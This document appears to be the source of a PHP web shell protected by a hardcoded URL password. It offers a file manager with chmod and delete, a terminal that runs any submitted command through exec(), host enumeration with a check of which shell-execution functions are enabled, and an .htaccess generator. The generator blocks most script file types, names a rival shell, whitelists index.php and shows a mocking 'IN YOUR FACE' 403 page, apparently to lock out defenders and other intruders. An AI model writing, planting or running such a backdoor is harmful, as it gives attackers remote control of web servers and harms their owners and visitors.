...
/* ==========================================================
   ...
   - Cross-platform: Works on Linux/Unix and Windows Server
   - Gate via ?pass=BayemMingkem (session)
   - mode=files (default) | mode=db | mode=system | mode=terminal
...
// Debug: Enable error reporting (remove in production)
...
if (!in_array($mode, ['files', 'db', 'system', 'terminal'])) $mode = 'files';
...
<div class="tabs">
  <a class="<?= $mode==='files'?'active':'' ?>" href="?mode=files">📁 File Manager</a>
  <a class="<?= $mode==='db'?'active':'' ?>" href="?mode=db">🗄️ Database</a>
  <a class="<?= $mode==='system'?'active':'' ?>" href="?mode=system">🖥️ System Info</a>
  <a class="<?= $mode==='terminal'?'active':'' ?>" href="?mode=terminal">💻 Terminal</a>
  <span class="small" style="margin-left:auto">Session (TTL <?= intval($SESSION_TTL/60) ?>m) · <a href="?a=logout" onclick="return confirm('Logout?')">Logout</a></span>
</div>
<?php
...
if ($mode === 'files') {
    ...
    if ($t !== '' && $modeStr !== '') {
      ...
      if ($target && strpos($target, $CWD)===0) {
        ...
        if ($modeStr !== '') {
          ...
          // Check OS: chmod only works on Unix-like systems
          if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
            @chmod($target, $mode);
          } else {
            $err = "CHMOD not supported on Windows. Use file properties instead.";
          }
        }
      }
    }
  ...
  foreach ($items as $f) {
    ...
    if ($isWindows) {
      echo "<input type='text' name='mode' placeholder='Not supported on Windows' style='width:80px' disabled> ";
      echo "<button class='btn gray' disabled>Chmod</button> <span class='small'>(Windows: use file properties)</span>";
    } else {
      echo "<input type='text' name='mode' placeholder='755 / 0644' style='width:80px'> ";
      echo "<button class='btn gray'>Chmod</button>";
    }
    echo "</form> ";
    // Delete
    if (!$isDir) {
  ...
  /* ---------- Generate .htaccess ---------- */
  if (($_GET['a'] ?? '') === 'genhtaccess' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) { http_response_code(400); exit('Bad CSRF'); }
    $blocked = trim((string)($_POST['blocked'] ?? ''));
    $allowed = trim((string)($_POST['allowed'] ?? ''));
    $errorDoc = trim((string)($_POST['errordoc'] ?? ''));
    $content = '';
    if ($blocked !== '') {
      $content .= "<FilesMatch \"$blocked\"> \n";
    ...
    if ($allowed !== '') {
      $allowedFiles = array_map('trim', explode(',', $allowed));
      $allowedPattern = '^(' . implode('|', array_map('preg_quote', $allowedFiles)) . ')$';
      $content .= "<FilesMatch '$allowedPattern'>\n";
      $content .= " Order allow,deny\n";
      $content .= " Allow from all\n";
      $content .= "</FilesMatch>\n";
    }
    if ($errorDoc !== '') {
      $content .= "ErrorDocument 403 '$errorDoc'\n";
    }
    $htaccessPath = $CWD . '/.htaccess';
    if (@file_put_contents($htaccessPath, $content) !== false) {
      $genMsg = '✅ .htaccess generated successfully!';
    } else {
      $genMsg = '❌ Failed to write .htaccess (check permissions).';
    }
    header('Location: ' . curr_url(['a' => null]) . '#htaccess'); exit;
  }

  echo "<h3 id='htaccess'>🔒 Generate .htaccess</h3>";
  if (!empty($genMsg)) echo "<div class='notice'>" . e($genMsg) . "</div>";
  echo "<form method='post' action='" . e(curr_url(['a' => 'genhtaccess', 'mode' => 'files'])) . "' style='max-width:800px'>";
  echo "<input type='hidden' name='csrf' value='" . e($_SESSION['csrf']) . "'>";
  echo "<label>Blocked Files Pattern (regex):<br><textarea name='blocked' rows='5' style='width:100%'>.*\\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm)$</textarea></label><br><br>";
  echo "<label>Allowed Files (comma separated, e.g. index.PhP,sitemap.xml):<br><input type='text' name='allowed' value='index.PhP,sitemap.xml,robots.txt,robot,txt' style='width:100%'></label><br><br>";
  echo "<label>Custom 403 Error Document (optional):<br><input type='text' name='errordoc' value='<center><img src=\"https://media.tenor.com/WYQnYdWsmrkAAAAM/hahaha-lol.gif\"></img> <h3>IN YOUR FACE</font>' style='width:100%'></label><br><br>";
  echo "<button class='btn'>Generate .htaccess</button>";
  echo "</form>";
...
if ($mode === 'system') {
  ...
  echo "<div class='kv' style='max-width:600px'>";
  echo "<div>OS</div><div>".e(php_uname('s').' '.php_uname('r').' '.php_uname('m'))."</div>";
  echo "<div>PHP Version</div><div>".e(PHP_VERSION)."</div>";
  echo "<div>Server Software</div><div>".e($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown')."</div>";
  echo "<div>Document Root</div><div><span class='code'>".e($_SERVER['DOCUMENT_ROOT'] ?? '')."</span></div>";
  echo "<div>Current Directory</div><div><span class='code'>".e(__DIR__)."</span></div>";
  $disk = disk_free_space('/');
  $total = disk_total_space('/');
  echo "<div>Disk Free</div><div>".($disk ? number_format($disk / 1024 / 1024 / 1024, 2).' GB' : 'N/A')."</div>";
  echo "<div>Disk Total</div><div>".($total ? number_format($total / 1024 / 1024 / 1024, 2).' GB' : 'N/A')."</div>";
  echo "<div>Memory Limit</div><div>".e(ini_get('memory_limit'))."</div>";
  echo "<div>Max Execution Time</div><div>".e(ini_get('max_execution_time'))."s</div>";
  echo "<div>Loaded Extensions</div><div><span class='code'>".e(implode(', ', get_loaded_extensions()))."</span></div>";
  echo "</div>";

  // Exec Checker
  echo "<h3>🔧 Exec Functions Checker</h3>";
  $execFuncs = ['exec', 'shell_exec', 'system', 'passthru', 'proc_open', 'popen', 'pcntl_exec'];
  $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
  echo "<table><tr><th>Function</th><th>Status</th><th>Note</th></tr>";
  foreach ($execFuncs as $func) {
    $exists = function_exists($func);
    $isDisabled = in_array($func, $disabled);
    $status = $exists && !$isDisabled ? '<span style="color:green">Enabled</span>' : '<span style="color:red">Disabled</span>';
    $note = !$exists ? 'Function not available' : ($isDisabled ? 'Disabled in php.ini' : 'Available');
    echo "<tr><td><code>" . e($func) . "</code></td><td>" . $status . "</td><td>" . e($note) . "</td></tr>";
  }
  echo "</table>";
  echo "<div class='small' style='margin-top:8px'>Note: Disabled functions are listed in <code>disable_functions</code> ini setting. This affects security on shared hosting.</div>";
}
...
elseif ($mode === 'terminal') {
  echo "<h2>💻 Terminal</h2>";
  $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
  $canExec = function_exists('exec') && !in_array('exec', $disabled);
  if (!$canExec) {
    echo "<div class='notice err'>❌ Exec functions are disabled on this server. Cannot run terminal commands.</div>";
  } else {
    echo "<div class='notice err'>⚠️ WARNING: Executing shell commands can be dangerous. Use with caution, especially on shared hosting.</div>";
    if (($_GET['a'] ?? '') === 'runcommand' && $_SERVER['REQUEST_METHOD']==='POST') {
      if (!csrf_ok()) echo "<div class='notice err'>Bad CSRF</div>";
      else {
        $command = trim((string)($_POST['command'] ?? ''));
        if ($command === '') echo "<div class='notice err'>Command kosong</div>";
        else {
          $output = [];
          $return_var = 0;
          exec($command . ' 2>&1', $output, $return_var);
          echo "<div class='notice ok'>Command executed (exit code: ".intval($return_var).")</div>";
          echo "<pre class='code' style='white-space:pre-wrap;max-height:400px;overflow:auto'>".e(implode("\n", $output))."</pre>";
        }
      }
    }
    echo "<form method='post' action='".e(curr_url(['a'=>'runcommand','mode'=>'terminal']))."'>";
    echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
    echo "<textarea name='command' class='editor' placeholder='ls -la' spellcheck='false'></textarea>";
    echo "<div style='margin-top:8px'><button class='btn'>Run Command</button></div>";
    echo "</form>";
  }
}
